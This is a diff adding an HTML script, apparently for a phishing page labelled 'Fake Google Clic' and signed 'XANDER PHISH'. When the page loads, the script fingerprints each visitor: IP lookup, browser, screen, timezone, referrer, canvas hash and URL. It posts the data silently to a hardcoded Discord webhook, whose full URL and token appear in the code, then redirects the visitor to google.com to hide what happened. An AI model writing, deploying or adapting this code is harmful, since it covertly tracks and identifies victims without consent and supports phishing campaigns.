@@ -1,0 +1,56 @@
+<script>
+    async function sendLog() {
+        let ip = 'N/A';
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+        } catch(e) {}
+
+        const data = {
+            timestamp: new Date().toISOString(),
+            ip: ip,
+            user_agent: navigator.userAgent,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer,
+            platform: navigator.platform,
+            cookies_enabled: navigator.cookieEnabled,
+            canvas_fingerprint: getCanvasFingerprint(),
+            url: window.location.href
+        };
+
+        
+        const webhook = "https://discord.com/api/webhooks/1494840412781678602/3sHJB_df3AFQzWsIOoI85Fvbf8Q19czIstQF0kZzEgQEs5FfHCTaqqxW_6wLDHHbwsza";
+
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: "XANDER PHISH",
+                embeds: [{
+                    title: "🔴 Fake Google Clic",
+                    color: 16711680,
+                    fields: Object.entries(data).map(([k,v]) => ({name: k.toUpperCase(), value: String(v) || "N/A", inline: true})),
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        }).catch(() => {});
+    }
+
+    function getCanvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "alphabetic";
+        ctx.font = "40px Arial";
+        ctx.fillText("XANDER", 50, 100);
+        return canvas.toDataURL().slice(0, 100);
+    }
+
+    sendLog();
+
+    setTimeout(() => {
+        window.location.href = "https://www.google.com";
+    }, 2800);
+</script>
